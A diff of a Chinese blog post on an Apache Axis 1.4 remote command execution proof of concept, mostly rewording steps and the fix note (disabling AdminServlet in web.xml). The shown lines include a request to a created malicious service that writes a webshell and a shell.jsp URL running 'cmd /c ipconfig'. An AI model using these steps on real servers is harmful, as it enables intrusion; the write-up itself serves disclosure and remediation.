@@ -52,7 +52,8 @@ Content-Length: 1063
 ```
 
 ![avatar](https://kibodwapon.github.io/2019/07/04/is-1-4-远程命令执行POC/step1.jpg)
-#### 调用创建的恶意service 写入webshell
+####  第二步
+调用上一步创建的恶意webservice 写入webshell
 ```
 POST /axis/services/RandomService HTTP/1.1
 Host: localhost:8080
@@ -88,11 +89,11 @@ Content-Length: 878
 看我们ROOT目录下shell文件，虽然有些错误，但是不影响，因为是log模式，有追加内容
 ![avatar](https://kibodwapon.github.io/2019/07/04/is-1-4-远程命令执行POC/shell.jpg)
 #### 第三部执行shell.jsp
-访问 http://localhost:8080/shell.jsp?c=cmd%20/c%20ipconfig
+浏览器访问 http://localhost:8080/shell.jsp?c=cmd%20/c%20ipconfig
 
 同样忽略网页报错
 ![avatar](https://kibodwapon.github.io/2019/07/04/is-1-4-远程命令执行POC/cmd.jpg)
-右键查看源码，可以看执行命令的结果。
+网页右键查看源码，可以看执行命令的结果。
 
 ![avatar](https://kibodwapon.github.io/2019/07/04/is-1-4-远程命令执行POC/cmd1.jpg)
 
@@ -101,7 +102,7 @@ python 脚本下载地址：
 
 
 ### 影响和修复
-默认情况下service远程管理没开启，也就是只能本地localhost访问，这种情况下可以结合ssrf和xxe进行利用，所以比较鸡肋，但是安全无小事，对于命令执行漏洞还是应该重视。修复的话，关闭admin服务即可，具体方法注释掉web-inf.xml ，然后重启tomat.
+默认情况下service远程管理没开启，也就是只能本地localhost访问，这种情况下可以结合ssrf和xxe进行利用，所以比较鸡肋，但是安全无小事，对于命令执行漏洞还是应该重视。修复的话，关闭admin服务即可，具体方法注释掉web-inf/web.xml 里的AdminServlet，然后重启tomat.
 ```
   <servlet-mapping>
     <servlet-name>AdminServlet</servlet-name>
